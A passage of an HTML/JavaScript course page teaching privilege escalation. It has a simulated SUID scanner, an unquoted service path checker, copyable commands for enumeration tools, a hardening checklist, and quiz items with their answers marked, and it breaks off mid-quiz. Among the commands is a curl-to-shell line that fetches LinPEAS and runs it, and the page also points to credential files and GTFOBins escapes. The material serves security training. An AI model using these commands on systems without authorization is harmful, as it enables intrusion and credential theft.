                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">Task Scheduler</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">Cron Jobs</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">LaunchDaemons/Agents</td>
                            </tr>
                            <tr>
                                <td style="padding: 15px; border: 1px solid var(--border); font-weight: 600;">Path Exploitation</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">Unquoted Service Paths</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">PATH Variable</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">PATH Variable</td>
                            </tr>
                            <tr>
                                <td style="padding: 15px; border: 1px solid var(--border); font-weight: 600;">Credentials</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">Unattend.xml, SAM</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">/etc/shadow, ssh keys</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">Keychain, plists</td>
                            </tr>
                            <tr>
                                <td style="padding: 15px; border: 1px solid var(--border); font-weight: 600;">Kernel Exploits</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">Windows Exploits</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">Linux Kernel CVEs</td>
                                <td style="padding: 15px; border: 1px solid var(--border); color: var(--text-dim);">XNU Kernel CVEs</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- SUID Finder Simulator -->
        <div id="suid-finder" class="section">
            <h2 style="color: var(--primary); margin-bottom: 20px;">SUID Binary Finder Simulator</h2>
            <p style="color: var(--text-dim); margin-bottom: 20px;">Practice identifying SUID binaries in a simulated Linux environment. Click "Scan System" to enumerate binaries with the SUID bit set.</p>

            <div class="terminal">
                <div class="terminal-header">root@hexworth:~#</div>
                <div id="suidOutput"></div>
                <div style="margin-top: 15px;">
                    <button class="check-btn" onclick="runSuidScan()">Scan System for SUID Binaries</button>
                    <button class="check-btn" onclick="checkSuidExploit()" style="margin-left: 10px; background: linear-gradient(135deg, var(--accent) 0%, #b91c1c 100%);">Check Exploitability</button>
                    <button class="check-btn" onclick="clearSuidTerminal()" style="margin-left: 10px; background: var(--surface-light);">Clear</button>
                </div>
            </div>

            <div class="card-grid" style="margin-top: 30px;">
                <div class="card">
                    <h3>What is SUID?</h3>
                    <p>SUID (Set User ID) is a special permission that allows a file to be executed with the privileges of the file owner, rather than the user running it.</p>
                    <div class="code-block">
                        <div class="code-header">Permission Format</div>
                        <code>-rwsr-xr-x  (SUID bit = 's' in owner execute position)
-rwxr-sr-x  (SGID bit = 's' in group execute position)</code>
                    </div>
                </div>

                <div class="card">
                    <h3>Common Vulnerable Binaries</h3>
                    <div class="code-block">
                        <code>• /usr/bin/find
• /usr/bin/vim
• /usr/bin/nmap (older versions)
• /usr/bin/python
• /usr/bin/perl
• /usr/bin/bash
• /usr/bin/less
• /usr/bin/more</code>
                    </div>
                </div>

                <div class="card">
                    <h3>Exploitation Resources</h3>
                    <p>Always reference GTFOBins for SUID exploitation techniques:</p>
                    <div class="code-block">
                        <code>🔗 https://gtfobins.github.io/

Search for the binary name to find:
• Shell escape sequences
• File read/write methods
• Sudo exploitation
• SUID exploitation</code>
                    </div>
                </div>
            </div>
        </div>

        <!-- Path Checker -->
        <div id="path-checker" class="section">
            <h2 style="color: var(--primary); margin-bottom: 20px;">Unquoted Service Path Checker</h2>
            <p style="color: var(--text-dim); margin-bottom: 20px;">Test Windows service paths for the unquoted path vulnerability. Enter a service path to check if it's vulnerable.</p>

            <div class="path-checker">
                <h3 style="color: var(--primary); margin-bottom: 15px;">Enter Service Path</h3>
                <input type="text" class="path-input" id="pathInput" placeholder="C:\Program Files\My Application\service.exe">
                <button class="check-btn" onclick="checkPath()">Analyze Path</button>

                <div id="pathResult" class="result-box"></div>
            </div>

            <div class="card-grid">
                <div class="card">
                    <h3>How It Works</h3>
                    <p>When Windows encounters an unquoted path with spaces, it tries to execute files in this order:</p>
                    <div class="code-block">
                        <div class="code-header">Example: C:\Program Files\My App\service.exe</div>
                        <code>1. C:\Program.exe
2. C:\Program Files\My.exe
3. C:\Program Files\My App\service.exe</code>
                    </div>
                    <p style="margin-top: 15px; color: var(--text-dim);">An attacker with write access to C:\ or C:\Program Files\ can place a malicious executable that gets executed instead.</p>
                </div>

                <div class="card">
                    <h3>Exploitation Requirements</h3>
                    <ul style="margin-left: 20px; color: var(--text-dim);">
                        <li>Service path contains spaces</li>
                        <li>Service path is NOT quoted</li>
                        <li>Write permissions on intermediate directories</li>
                        <li>Service runs with elevated privileges</li>
                        <li>Ability to restart service or system</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>Remediation</h3>
                    <p>Always quote service paths containing spaces:</p>
                    <div class="code-block">
                        <div class="code-header">Vulnerable</div>
                        <code>C:\Program Files\My Application\service.exe</code>
                    </div>
                    <div class="code-block">
                        <div class="code-header">Secure</div>
                        <code>"C:\Program Files\My Application\service.exe"</code>
                    </div>
                </div>
            </div>

            <div class="privilege-ladder" style="margin-top: 30px;">
                <h3 style="color: var(--primary); text-align: center; margin-bottom: 20px;">Test These Examples</h3>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px;">
                    <div class="code-block" style="cursor: pointer;" onclick="testPath('C:\\Program Files\\Vulnerable Service\\app.exe')">
                        <code>C:\Program Files\Vulnerable Service\app.exe</code>
                    </div>
                    <div class="code-block" style="cursor: pointer;" onclick="testPath('C:\\Custom Apps\\My Service\\bin\\service.exe')">
                        <code>C:\Custom Apps\My Service\bin\service.exe</code>
                    </div>
                    <div class="code-block" style="cursor: pointer;" onclick="testPath('\"C:\\Program Files\\Safe Service\\app.exe\"')">
                        <code>"C:\Program Files\Safe Service\app.exe"</code>
                    </div>
                    <div class="code-block" style="cursor: pointer;" onclick="testPath('C:\\Windows\\System32\\svchost.exe')">
                        <code>C:\Windows\System32\svchost.exe</code>
                    </div>
                </div>
            </div>
        </div>

        <!-- Tools Section -->
        <div id="tools" class="section">
            <h2 style="color: var(--primary); margin-bottom: 20px;">Privilege Escalation Tools</h2>
            <p style="color: var(--text-dim); margin-bottom: 30px;">Comprehensive reference for automated enumeration and exploitation tools. Click any command to copy to clipboard.</p>

            <div class="tab-container">
                <div class="tab-headers">
                    <button class="tab-header active" onclick="switchTab('windows-tools')">Windows Tools</button>
                    <button class="tab-header" onclick="switchTab('linux-tools')">Linux Tools</button>
                    <button class="tab-header" onclick="switchTab('cross-platform-tools')">Cross-Platform</button>
                </div>

                <div id="windows-tools" class="tab-content active">
                    <div class="tool-card">
                        <div class="tool-name">WinPEAS (Windows Privilege Escalation Awesome Scripts)</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Automated Windows enumeration script that checks for common privilege escalation vectors.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">winpeas.exe</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">winpeas.exe quiet</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">winpeas.exe systeminfo</div>
                        <p style="margin-top: 10px; color: var(--text-dim); font-size: 0.9em;">Part of PEASS-ng suite. Outputs color-coded findings.</p>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">PowerUp (PowerSploit)</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">PowerShell script for Windows privilege escalation enumeration.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">Import-Module .\PowerUp.ps1</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">Invoke-AllChecks</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">Invoke-ServiceAbuse -Name VulnService</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Windows Exploit Suggester</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Compares system patch level against Microsoft vulnerability database.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">systeminfo > systeminfo.txt</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">windows-exploit-suggester.py --database 2024-12-23-mssb.xls --systeminfo systeminfo.txt</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Seatbelt</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">C# project for offensive security host survey and situational awareness.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">Seatbelt.exe all</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">Seatbelt.exe -group=system</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">Seatbelt.exe -group=user</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">BeRoot</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Post-exploitation tool to check common Windows misconfigurations.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">beRoot.exe</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Watson</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Enumerate missing KBs and suggest exploits for Privilege Escalation.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">Watson.exe</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Robber (DLL Hijacking)</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Tool to find DLL hijacking opportunities.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">robber.exe -d C:\Program Files\TargetApp</div>
                    </div>
                </div>

                <div id="linux-tools" class="tab-content">
                    <div class="tool-card">
                        <div class="tool-name">LinPEAS (Linux Privilege Escalation Awesome Script)</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Automated Linux/Unix enumeration script.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">./linpeas.sh</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">./linpeas.sh -a</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">LinuxPrivChecker</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Python script to enumerate system configuration and identify privilege escalation vectors.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">python linuxprivchecker.py</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">python3 linuxprivchecker.py -w -o output.txt</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Linux Exploit Suggester</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Suggests kernel exploits based on operating system version.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">./linux-exploit-suggester.sh</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">./linux-exploit-suggester-2.pl</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Unix-Privesc-Check</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Shell script to check for common privilege escalation vectors.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">./unix-privesc-check standard</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">./unix-privesc-check detailed</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">pspy</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Unprivileged Linux process snooping to detect cron jobs, etc.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">./pspy64</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">./pspy32 -pf -i 1000</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">GTFOBins Reference Commands</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Manual enumeration commands for finding exploitable binaries.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">find / -perm -4000 -type f 2>/dev/null</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">sudo -l</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">getcap -r / 2>/dev/null</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">cat /etc/crontab</div>
                    </div>
                </div>

                <div id="cross-platform-tools" class="tab-content">
                    <div class="tool-card">
                        <div class="tool-name">PEASS-ng Suite</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Cross-platform privilege escalation suite (WinPEAS, LinPEAS, MacPEAS).</p>
                        <div class="code-block">
                            <div class="code-header">Installation</div>
                            <code>git clone https://github.com/carlospolop/PEASS-ng.git</code>
                        </div>
                        <p style="margin-top: 10px; color: var(--text-dim);">Supports Windows, Linux, and macOS with color-coded output.</p>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">BeRoot</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Available for Windows, Linux, and macOS.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">beroot.exe  # Windows</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">python beroot.py  # Linux</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">python beroot.py  # macOS</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Metasploit Local Exploit Suggester</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Automated exploit suggestion based on active session.</p>
                        <div class="tool-command" onclick="copyToClipboard(this)">use post/multi/recon/local_exploit_suggester</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">set SESSION 1</div>
                        <div class="tool-command" onclick="copyToClipboard(this)">run</div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Manual Enumeration</div>
                        <p style="color: var(--text-dim); margin-bottom: 15px;">Essential commands to run on any system.</p>
                        <div class="code-block">
                            <div class="code-header">System Information</div>
                            <code># Windows
systeminfo
whoami /all

# Linux
uname -a
id
cat /etc/os-release</code>
                        </div>
                        <div class="code-block">
                            <div class="code-header">Network Information</div>
                            <code># Windows
ipconfig /all
netstat -ano

# Linux
ifconfig
netstat -tulpn</code>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Defense Section -->
        <div id="defense" class="section">
            <h2 style="color: var(--primary); margin-bottom: 20px;">Defense & Hardening</h2>
            <p style="color: var(--text-dim); margin-bottom: 30px;">Implement these security measures to prevent privilege escalation attacks. Check off items as you implement them.</p>

            <div class="checklist">
                <h3 style="color: var(--primary); margin-bottom: 20px;">General Security Measures</h3>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Keep Systems Updated</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Regularly apply security patches and updates for OS and applications</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Principle of Least Privilege</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Users and services should operate with minimal required permissions</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Multi-Factor Authentication</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Implement MFA for all administrative accounts</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Application Whitelisting</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Use AppLocker or similar to control executable execution</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Security Auditing & Logging</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Enable comprehensive logging and monitor for suspicious activity</p>
                    </div>
                </div>
            </div>

            <div class="checklist" style="margin-top: 30px;">
                <h3 style="color: var(--primary); margin-bottom: 20px;">Windows-Specific Hardening</h3>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Quote Service Paths</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Ensure all service paths with spaces are properly quoted</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Disable AlwaysInstallElevated</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Remove registry keys that allow MSI installation with elevated privileges</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Secure DLL Search Order</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Enable SafeDllSearchMode and use fully qualified paths</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Review Scheduled Tasks</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Audit tasks for proper permissions and secure script locations</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Restrict Token Privileges</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Minimize SeImpersonate and other dangerous privileges</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Remove Unattended Installation Files</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Delete unattend.xml and similar files containing credentials</p>
                    </div>
                </div>
            </div>

            <div class="checklist" style="margin-top: 30px;">
                <h3 style="color: var(--primary); margin-bottom: 20px;">Linux-Specific Hardening</h3>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Audit SUID/SGID Binaries</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Regularly review and remove unnecessary SUID/SGID permissions</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Configure Sudo Properly</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Use specific command paths, avoid NOPASSWD where possible</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Secure Cron Jobs</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Ensure cron scripts are owned by root with proper permissions (644)</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Apply Kernel Updates</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Keep kernel updated to patch privilege escalation vulnerabilities</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Protect PATH Variable</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Use absolute paths in scripts, restrict PATH modifications</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Review Capabilities</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Audit and minimize Linux capabilities on binaries</p>
                    </div>
                </div>
                <div class="checklist-item" onclick="toggleChecklist(this)">
                    <div class="checkbox"></div>
                    <div>
                        <strong>Implement SELinux/AppArmor</strong>
                        <p style="color: var(--text-dim); margin: 5px 0 0 0; font-size: 0.9em;">Use mandatory access control systems</p>
                    </div>
                </div>
            </div>

            <div class="card-grid" style="margin-top: 30px;">
                <div class="card">
                    <h3>CIS Hardening Guides</h3>
                    <p>Follow Center for Internet Security benchmarks:</p>
                    <ul style="margin-left: 20px; color: var(--text-dim); margin-top: 10px;">
                        <li>CIS Microsoft Windows Benchmarks</li>
                        <li>CIS Linux Distribution Benchmarks</li>
                        <li>CIS Apple macOS Benchmarks</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>STIG Compliance</h3>
                    <p>Implement Security Technical Implementation Guides:</p>
                    <ul style="margin-left: 20px; color: var(--text-dim); margin-top: 10px;">
                        <li>DoD Windows STIGs</li>
                        <li>DoD Linux STIGs</li>
                        <li>Regular compliance scanning</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>Monitoring & Detection</h3>
                    <p>Implement detection mechanisms:</p>
                    <ul style="margin-left: 20px; color: var(--text-dim); margin-top: 10px;">
                        <li>EDR/XDR solutions</li>
                        <li>SIEM correlation rules</li>
                        <li>File integrity monitoring</li>
                        <li>Privilege escalation alerts</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- Quiz Section -->
        <div id="quiz" class="section">
            <h2 style="color: var(--primary); margin-bottom: 20px;">Privilege Escalation Assessment</h2>
            <p style="color: var(--text-dim); margin-bottom: 30px;">Test your knowledge with these 12 questions. Score 80% or higher to earn 80 XP!</p>

            <div class="quiz-container" id="quizContainer">
                <!-- Questions will be generated by JavaScript -->
            </div>

            <button class="quiz-btn" id="submitQuiz" onclick="submitQuiz()">Submit Assessment</button>

            <div id="quizResults"></div>
        </div>
    </div>

    <script>
        // Navigation
        function showSection(sectionId) {
            // Hide all sections
            document.querySelectorAll('.section').forEach(section => {
                section.classList.remove('active');
            });

            // Remove active class from all nav buttons
            document.querySelectorAll('.nav-btn').forEach(btn => {
                btn.classList.remove('active');
            });

            // Show selected section
            document.getElementById(sectionId).classList.add('active');

            // Add active class to clicked button
            event.target.classList.add('active');

            // Update progress
            updateProgress();

            // Save state
            localStorage.setItem('hexworth_privesc_section', sectionId);
        }

        // Tab Switching
        function switchTab(tabId) {
            const container = event.target.closest('.tab-container');

            // Remove active from all headers in this container
            container.querySelectorAll('.tab-header').forEach(header => {
                header.classList.remove('active');
            });

            // Remove active from all content in this container
            container.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });

            // Add active to clicked header
            event.target.classList.add('active');

            // Add active to corresponding content
            container.querySelector(`#${tabId}`).classList.add('active');
        }

        // Ladder Step Highlight
        function highlightStep(element) {
            document.querySelectorAll('.ladder-step').forEach(step => {
                step.classList.remove('active');
            });
            element.classList.add('active');
        }

        // SUID Finder Simulator
        const suidBinaries = [
            { path: '/usr/bin/passwd', owner: 'root', perms: '-rwsr-xr-x', vulnerable: false },
            { path: '/usr/bin/sudo', owner: 'root', perms: '-rwsr-xr-x', vulnerable: false },
            { path: '/usr/bin/find', owner: 'root', perms: '-rwsr-xr-x', vulnerable: true },
            { path: '/usr/bin/vim', owner: 'root', perms: '-rwsr-xr-x', vulnerable: true },
            { path: '/usr/bin/nmap', owner: 'root', perms: '-rwsr-xr-x', vulnerable: true },
            { path: '/usr/bin/python3.8', owner: 'root', perms: '-rwsr-xr-x', vulnerable: true },
            { path: '/usr/bin/less', owner: 'root', perms: '-rwsr-xr-x', vulnerable: true },
            { path: '/usr/bin/bash', owner: 'root', perms: '-rwsr-xr-x', vulnerable: true },
            { path: '/usr/lib/dbus-1.0/dbus-daemon-launch-helper', owner: 'root', perms: '-rwsr-xr-x', vulnerable: false },
            { path: '/usr/lib/openssh/ssh-keysign', owner: 'root', perms: '-rwsr-xr-x', vulnerable: false },
        ];

        function runSuidScan() {
            const output = document.getElementById('suidOutput');
            output.innerHTML = '<div class="terminal-line"><span class="terminal-prompt">root@hexworth:~# </span>find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null</div>';

            let delay = 500;
            suidBinaries.forEach((binary, index) => {
                setTimeout(() => {
                    const line = document.createElement('div');
                    line.className = 'terminal-line';
                    line.textContent = `${binary.perms} 1 ${binary.owner} ${binary.owner} 12345 Jan 15 2024 ${binary.path}`;
                    output.appendChild(line);
                }, delay + (index * 200));
            });

            setTimeout(() => {
                const summary = document.createElement('div');
                summary.className = 'terminal-output';
                summary.innerHTML = `\n[+] Found ${suidBinaries.length} SUID binaries\n[!] ${suidBinaries.filter(b => b.vulnerable).length} potentially exploitable binaries detected`;
                output.appendChild(summary);
            }, delay + (suidBinaries.length * 200) + 500);
        }

        function checkSuidExploit() {
            const output = document.getElementById('suidOutput');
            const existing = output.innerHTML;

            if (!existing || existing.length < 100) {
                alert('Please run a SUID scan first!');
                return;
            }

            const exploitable = suidBinaries.filter(b => b.vulnerable);

            setTimeout(() => {
                const analysis = document.createElement('div');
                analysis.className = 'terminal-output';
                analysis.innerHTML = `\n[*] Analyzing exploitability...\n\n[!] VULNERABLE BINARIES FOUND:\n`;

                exploitable.forEach(binary => {
                    analysis.innerHTML += `\n[!] ${binary.path}\n    → Check GTFOBins for exploitation techniques`;
                });

                analysis.innerHTML += `\n\n[*] Recommendation: Visit https://gtfobins.github.io/\n[*] Search for binary names to find exploitation methods`;

                output.appendChild(analysis);
            }, 500);
        }

        function clearSuidTerminal() {
            document.getElementById('suidOutput').innerHTML = '';
        }

        // Path Checker
        function checkPath() {
            const pathInput = document.getElementById('pathInput').value;
            const resultBox = document.getElementById('pathResult');

            if (!pathInput) {
                alert('Please enter a service path');
                return;
            }

            // Check if path has spaces and is not quoted
            const hasSpaces = pathInput.includes(' ');
            const isQuoted = (pathInput.startsWith('"') && pathInput.endsWith('"')) ||
                            (pathInput.startsWith("'") && pathInput.endsWith("'"));

            const isVulnerable = hasSpaces && !isQuoted;

            resultBox.classList.remove('vulnerable', 'safe');
            resultBox.classList.add('show');

            if (isVulnerable) {
                resultBox.classList.add('vulnerable');

                // Generate exploitation paths
                const paths = generateExploitPaths(pathInput);

                resultBox.innerHTML = `
                    <h3 style="color: var(--accent); margin-bottom: 15px;">⚠️ VULNERABLE PATH DETECTED</h3>
                    <p style="color: var(--text-dim); margin-bottom: 15px;">This service path is vulnerable to unquoted path exploitation.</p>
                    <div style="background: var(--code-bg); padding: 15px; border-radius: 6px; margin: 10px 0;">
                        <strong style="color: var(--primary);">Windows will attempt to execute in this order:</strong>
                        ${paths.map((p, i) => `<div style="color: var(--success); margin-top: 8px;">${i + 1}. ${p}</div>`).join('')}
                    </div>
                    <p style="color: var(--warning); margin-top: 15px;">⚡ An attacker with write access to intermediate directories can place a malicious executable.</p>
                    <p style="color: var(--success); margin-top: 10px;"><strong>Fix:</strong> Quote the path: "${pathInput}"</p>
                `;
            } else if (hasSpaces && isQuoted) {
                resultBox.classList.add('safe');
                resultBox.innerHTML = `
                    <h3 style="color: var(--success); margin-bottom: 15px;">✓ PATH IS SECURE</h3>
                    <p style="color: var(--text-dim);">The path contains spaces but is properly quoted. This prevents unquoted path exploitation.</p>
                `;
            } else {
                resultBox.classList.add('safe');
                resultBox.innerHTML = `
                    <h3 style="color: var(--success); margin-bottom: 15px;">✓ PATH IS SECURE</h3>
                    <p style="color: var(--text-dim);">The path contains no spaces, so it is not vulnerable to unquoted path exploitation.</p>
                `;
            }
        }

        function generateExploitPaths(path) {
            // Remove quotes if present
            path = path.replace(/^["']|["']$/g, '');

            const parts = path.split('\\');
            const exploitPaths = [];

            for (let i = 1; i < parts.length; i++) {
                const currentPath = parts.slice(0, i).join('\\');
                const lastPart = parts[i - 1];

                if (lastPart.includes(' ')) {
                    const spaceParts = lastPart.split(' ');
                    for (let j = 1; j <= spaceParts.length; j++) {
                        const truncated = spaceParts.slice(0, j).join(' ');
                        const beforePath = parts.slice(0, i - 1).join('\\');
                        const exploitPath = beforePath ? `${beforePath}\\${truncated}.exe` : `${truncated}.exe`;
                        if (!exploitPaths.includes(exploitPath)) {
                            exploitPaths.push(exploitPath);
                        }
                    }
                }
            }

            exploitPaths.push(path);
            return exploitPaths;
        }

        function testPath(path) {
            document.getElementById('pathInput').value = path;
            checkPath();

            // Scroll to result
            document.getElementById('pathResult').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }

        // Copy to Clipboard
        function copyToClipboard(element) {
            const text = element.textContent;
            navigator.clipboard.writeText(text).then(() => {
                const original = element.style.background;
                element.style.background = 'rgba(16, 185, 129, 0.3)';
                element.textContent = '✓ Copied!';

                setTimeout(() => {
                    element.style.background = original;
                    element.textContent = text;
                }, 1500);
            });
        }

        // Checklist Toggle
        function toggleChecklist(element) {
            element.classList.toggle('checked');

            const checked = element.classList.contains('checked');
            const checkbox = element.querySelector('.checkbox');
            checkbox.textContent = checked ? '✓' : '';

            updateProgress();
            saveChecklistState();
        }

        function saveChecklistState() {
            const checkedItems = [];
            document.querySelectorAll('.checklist-item.checked').forEach(item => {
                checkedItems.push(item.textContent);
            });
            localStorage.setItem('hexworth_privesc_checklist', JSON.stringify(checkedItems));
        }

        function loadChecklistState() {
            const saved = localStorage.getItem('hexworth_privesc_checklist');
            if (saved) {
                const checkedItems = JSON.parse(saved);
                document.querySelectorAll('.checklist-item').forEach(item => {
                    if (checkedItems.includes(item.textContent)) {
                        item.classList.add('checked');
                        item.querySelector('.checkbox').textContent = '✓';
                    }
                });
            }
        }

        // Quiz Questions
        const quizQuestions = [
            {
                question: "What are the two main types of privilege escalation?",
                options: [
                    "Vertical and Diagonal",
                    "Horizontal and Vertical",
                    "Direct and Indirect",
                    "Local and Remote"
                ],
                correct: 1
            },
            {
                question: "Which Windows registry setting allows MSI packages to install with SYSTEM privileges?",
                options: [
                    "AutoInstallElevated",
                    "AlwaysInstallElevated",
                    "ElevatedInstall",
                    "MsiElevatedInstall"
                ],
                correct: 1
            },
            {
                question: "What command finds SUID binaries in Linux?",
                options: [
                    "find / -perm -777 -type f",
                    "find / -user root -type f",
                    "find / -perm -4000 -type f",
                    "find / -executable -type f"
                ],
                correct: 2
            },
            {
                question: "Which privilege allows token impersonation attacks on Windows?",
                options: [
                    "SeDebugPrivilege",
                    "SeImpersonatePrivilege",
                    "SeTokenPrivilege",
                    "SeAdminPrivilege"
                ],
                correct: 1
            },
            {
